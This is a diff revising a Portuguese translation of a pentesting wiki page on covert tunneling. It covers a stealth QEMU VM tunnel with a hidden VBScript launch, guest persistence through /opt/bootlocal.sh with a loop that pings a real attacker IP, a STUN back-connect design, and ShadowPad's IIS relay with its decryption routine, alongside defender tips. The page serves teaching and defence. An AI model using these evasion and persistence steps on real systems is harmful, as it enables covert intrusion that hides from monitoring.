+Solicitações STUN Binding enviadas de um socket UDP podem revelar seu endereço IP e porta server-reflexive, enquanto o tráfego periódico mantém o mapeamento NAT ativo. Um servidor STUN público não é um relay para pacotes de controle arbitrários.<sup>[[60]](#references)</sup> Um design de back-connect analisado manteve o mesmo socket UDP para um datagrama de controle curto e, em seguida, usou uma *conexão TCP de saída separada* para buscar e executar comandos após a chegada do gatilho.<sup>[[59]](#references)</sup>
 
-Para receber o pacote UDP do controlador, um design ainda precisa compartilhar o mapeamento com esse controlador e atender à política de filtragem do NAT. A filtragem dependente de endereço ou porta pode aceitar respostas do servidor STUN, mas descartar pacotes de outro endpoint.<sup>[[60]](#references)[[61]](#references)</sup> O caminho de rendezvous do backdoor analisado não foi verificado; portanto, respostas STUN bem-sucedidas, por si só, não comprovam que o canal de controle esteja acessível.<sup>[[59]](#references)</sup> Para um protocolo separado com rendezvous explícito e fallback de relay, consulte [travessia de NAT em câmeras PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).
+Para receber o pacote UDP do controlador, um design ainda precisa compartilhar o mapeamento com esse controlador e atender à política de filtragem do NAT. A filtragem dependente de endereço ou porta pode aceitar respostas do servidor STUN, mas descartar pacotes de outro endpoint.<sup>[[60]](#references)[[61]](#references)</sup> O caminho de rendezvous do backdoor analisado não foi verificado; portanto, respostas STUN bem-sucedidas, por si só, não provam que o canal de controle está acessível.<sup>[[59]](#references)</sup> Para um protocolo separado com rendezvous explícito e fallback para relay, consulte [travessia de NAT de câmeras PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).
 
 ## Túneis furtivos baseados em VM com QEMU
 
-A rede em modo de usuário do QEMU não exige privilégios de root ou administrador para a rede virtual, e `-netdev user,hostfwd=...` redireciona conexões TCP, UDP ou UNIX do host para o guest.<sup>[[51]](#references)</sup> A TrustedSec documentou uma VM Tiny Core com QEMU e uma tentativa de túnel SSH reverso em um incidente no qual um EDR focado no host poderia não detectar atividades dentro do guest.<sup>[[1]](#references)</sup>
+A rede em modo de usuário do QEMU não requer privilégios de root ou de administrador para a rede virtual, e `-netdev user,hostfwd=...` redireciona conexões TCP, UDP ou UNIX do host para o guest.<sup>[[51]](#references)</sup> A TrustedSec documentou uma VM Tiny Core QEMU e uma tentativa de túnel SSH reverso em um incidente no qual um EDR focado no host poderia não detectar a atividade dentro do guest.<sup>[[1]](#references)</sup>
 
-### Comando rápido em uma linha
+### Comando rápido de uma linha
 
 ```powershell
 # Windows victim (user-mode networking; no TAP driver is needed for this example)
@@ -962,9 +979,9 @@ qemu-system-x86_64.exe ^
 
 • O comando acima inicia um guest **Tiny Core Linux** com 256 MiB de memória e um disco qcow2; a imagem de disco não é um disco em RAM.
 • A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do guest.  
-• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; todos os pacotes que chegam a ela são tratados pelo servidor SSH em execução na VM.
+• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; qualquer pacote que chega a ela é tratado pelo servidor SSH em execução na VM.
 
-### Iniciando de forma furtiva por meio de VBScript
+### Iniciar furtivamente por meio de VBScript
 
 A TrustedSec observou inicializações do QEMU acionadas por VBS e imagens do Tiny Core no incidente citado acima.<sup>[[1]](#references)</sup>
 
@@ -981,7 +998,7 @@ Executar o script com `cscript.exe //B update.vbs` mantém a janela oculta.<sup>
 O incidente citado descreve a persistência no guest stateless Tiny Core por meio de `/opt/bootlocal.sh` e `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
 
 1. Gravar o payload em `/opt/123.out`  
-2. Acrescentar ao `/opt/bootlocal.sh`:
+2. Acrescentar a `/opt/bootlocal.sh`:
 
    ```sh
    while ! ping -c1 45.77.4.101; do sleep 2; done
@@ -993,23 +1010,23 @@ O incidente citado descreve a persistência no guest stateless Tiny Core por mei
 ### Considerações sobre telemetria
 
 • O host ainda expõe o processo QEMU, a imagem qcow2 e qualquer listener encaminhado pelo host.  
-• As varreduras de processos feitas apenas no host talvez não inspecionem os processos do guest, mas a virtualização não garante evasão; a telemetria de rede, QEMU e da imagem ainda pode expô-la.<sup>[[1]](#references)[[51]](#references)</sup>
+• Varreduras de processos feitas somente no host podem não inspecionar processos do guest, mas a virtualização não garante evasão; a telemetria de rede, QEMU e imagem ainda pode expor isso.<sup>[[1]](#references)[[51]](#references)</sup>
 
-### Dicas para o defensor
+### Dicas para defesa
 
-• Gere alertas para **binários inesperados do QEMU/VirtualBox/KVM** em caminhos graváveis pelo usuário.  
-• Bloqueie conexões de saída originadas por `qemu-system*.exe`.  
-• Procure por portas de escuta raras (2222, 10022, …) que começam a escutar imediatamente após a inicialização do QEMU.
+• Gere alertas sobre **binários QEMU/VirtualBox/KVM inesperados** em caminhos graváveis pelo usuário.  
+• Bloqueie conexões de saída originadas de `qemu-system*.exe`.  
+• Investigue portas de escuta incomuns (2222, 10022, …) que começam a escutar logo após o lançamento do QEMU.
 
 ## Nós de relay IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)
 
-A Check Point descreve o módulo IIS do ShadowPad como uma forma de transformar servidores web de perímetro comprometidos em nós de backdoor e relay, vinculando prefixos de URL por meio de `HttpAddUrl`.<sup>[[3]](#references)</sup>
+A Check Point descreve o módulo IIS do ShadowPad como um meio de transformar servidores web de perímetro comprometidos em backdoors e nós de relay, vinculando prefixos de URL por meio de `HttpAddUrl`.<sup>[[3]](#references)</sup>
 
-O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia de pacotes, as filas de relay e a telemetria de depuração resumidos abaixo.<sup>[[3]](#references)</sup>
+O mesmo relatório detalha as configurações padrão, os listeners wildcard, a descriptografia de pacotes, as filas de relay e a telemetria de depuração resumidos abaixo.<sup>[[3]](#references)</sup>
 
-* **Padrões de configuração** – se a configuração JSON do módulo omitir valores, ele recorrerá a padrões plausíveis do IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Assim, o IIS responde ao tráfego benigno com a identidade visual correta.
-* **Interceptação wildcard** – os operadores fornecem uma lista de prefixos de URL separados por ponto e vírgula (wildcards no host e no caminho). O módulo chama `HttpAddUrl` para cada entrada, fazendo com que o HTTP.sys encaminhe as solicitações correspondentes ao handler malicioso; as solicitações não correspondentes seguem o comportamento normal do IIS.
-* **Primeiro pacote criptografado** – os dois primeiros bytes do corpo da solicitação contêm a seed de um PRNG personalizado de 32 bits. Cada byte seguinte passa por XOR com o keystream gerado antes da análise do protocolo:
+* **Configurações padrão** – se a configuração JSON do módulo omitir valores, ele usa padrões plausíveis do IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Assim, o IIS responde ao tráfego benigno com a identidade visual correta.
+* **Intercepção wildcard** – os operadores fornecem uma lista de prefixos de URL separados por ponto e vírgula (wildcards no host e no caminho). O módulo chama `HttpAddUrl` para cada entrada, fazendo com que o HTTP.sys encaminhe as solicitações correspondentes para o handler malicioso; solicitações não correspondentes seguem o comportamento normal do IIS.
+* **Primeiro pacote criptografado** – os dois primeiros bytes do corpo da solicitação contêm a seed de um PRNG personalizado de 32 bits. Cada byte subsequente passa por XOR com o keystream gerado antes da análise do protocolo:
 
   ```python
   def decrypt_first_packet(buf):
@@ -1023,8 +1040,8 @@ O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia
       return out
   ```
 
-* **Orquestração do relay** – o módulo mantém duas listas: “servidores” (nós upstream) e “clientes” (implants downstream). As entradas são removidas se nenhum heartbeat chegar em aproximadamente 30 segundos. Quando ambas as listas não estão vazias, ele emparelha o primeiro servidor saudável com o primeiro cliente saudável e simplesmente encaminha bytes entre os sockets deles até que um dos lados feche a conexão.
-* **Telemetria de depuração** – o registro opcional grava o IP de origem, o IP de destino e o total de bytes encaminhados para cada emparelhamento. Investigadores usaram essas pistas para reconstruir a malha do ShadowPad que abrangia várias vítimas.
+* **Orquestração de relay** – o módulo mantém duas listas: “servidores” (nós upstream) e “clientes” (implants downstream). As entradas são removidas se nenhum heartbeat chegar em cerca de 30 segundos. Quando as duas listas não estão vazias, ele emparelha o primeiro servidor saudável com o primeiro cliente saudável e simplesmente encaminha bytes entre os sockets até que um dos lados feche a conexão.
+* **Telemetria de depuração** – o registro opcional anota o IP de origem, o IP de destino e o total de bytes encaminhados em cada emparelhamento. Investigadores usaram essas pistas para reconstruir a malha ShadowPad que abrangia várias vítimas.
 
 ---
 
@@ -1035,8 +1052,8 @@ O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia
 
 ## References
 
-- [1] [Escondido nas sombras: túneis furtivos via virtualização QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
-- [2] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [1] [Escondidos nas sombras: túneis furtivos via virtualização QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [2] [Check Point Research – Antes do ToolShell: explorando as operações de ransomware anteriores do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 - [3] [Check Point Research – Por dentro do Ink Dragon: revelando a rede de relay e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [4] [README do Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
 - [5] [Guia de referência do Nmap: contornar restrições de firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
@@ -1044,7 +1061,7 @@ O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia
 - [7] [Manual do sshd_config do OpenBSD](https://man.openbsd.org/sshd_config)
 - [8] [Notas de lançamento do OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
 - [9] [README do sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
-- [10] [Metasploit: pivoting no Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+- [10] [Metasploit: Pivoting no Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
 - [11] [Documentação do módulo socks_proxy do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
 - [12] [Documentação do módulo autoroute do Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
 - [13] [Cobalt Strike: proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
@@ -1070,13 +1087,13 @@ O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia
 - [33] [README do dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
 - [34] [README do proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
 - [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
-- [36] [RFC 1035: Nomes de domínio – implementação e especificação](https://www.rfc-editor.org/rfc/rfc1035)
+- [36] [RFC 1035: nomes de domínio — implementação e especificação](https://www.rfc-editor.org/rfc/rfc1035)
 - [37] [Hans](https://code.gerade.org/hans/)
 - [38] [README do ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
-- [39] [CLI do ngrok Agent](https://ngrok.com/docs/agent/cli)
-- [40] [Interface de inspeção Web do ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
-- [41] [Hosts virtuais do ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
-- [42] [Configuração v2 do ngrok Agent](https://ngrok.com/docs/agent/config/v2)
+- [39] [CLI do agente ngrok](https://ngrok.com/docs/agent/cli)
+- [40] [Interface de inspeção web do ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
+- [41] [hosts virtuais do ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
+- [42] [Configuração v2 do agente ngrok](https://ngrok.com/docs/agent/config/v2)
 - [43] [Visão geral do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
 - [44] [Parâmetros de origem do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
 - [45] [Configuração do Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
@@ -1088,14 +1105,18 @@ O mesmo relatório detalha os padrões, os listeners wildcard, a descriptografia
 - [51] [Documentação de rede do QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
 - [52] [README do wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
 - [53] [Repositório do código-fonte do NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
-- [54] [BOFScale: uma tailnet com fronting de CDN a partir de um BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
-- [55] [Microsoft Learn - Comandos da CLI do Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
+- [54] [BOFScale: uma tailnet com front-end CDN a partir de um BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
+- [55] [Microsoft Learn - comandos da CLI do Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
 - [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
 - [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
-- [58] [APT NightEagle: GhostContainer e tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
-- [59] [FortiGuard Labs - Backdoor ClingSTUN para Linux abusa da infraestrutura pública do STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
-- [60] [RFC 8489 - Utilitários de travessia de sessão para NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
-- [61] [RFC 4787 - Requisitos comportamentais de NAT para UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
+- [58] [APT NightEagle: GhostContainer e tunelamento](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
+- [59] [FortiGuard Labs - backdoor ClingSTUN para Linux abusa da infraestrutura pública STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
+- [60] [RFC 8489 - utilitários de travessia de sessão para NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
+- [61] [RFC 4787 - requisitos comportamentais de NAT para UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
 - [62] [README do Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
-- [63] [Malwarebytes - O malware Kothamine usa o tailcat do Tailscale para evitar a detecção de rede](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
+- [63] [Malwarebytes - malware Kothamine usa o tailcat do Tailscale para escapar da detecção de rede](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
+- [64] [README do Yggstack](https://github.com/yggdrasil-network/yggstack)
+- [65] [Configuração do Yggdrasil: conexão com peers](https://yggdrasil-network.github.io/configuration.html)
+- [66] [Perguntas frequentes do Yggdrasil: anonimato e peering](https://yggdrasil-network.github.io/faq.html)
+- [67] [ESET Research: backdoor MythicRatatoskr habilitado pelo Yggdrasil](https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration)
 {{#include ../banners/hacktricks-training.md}}
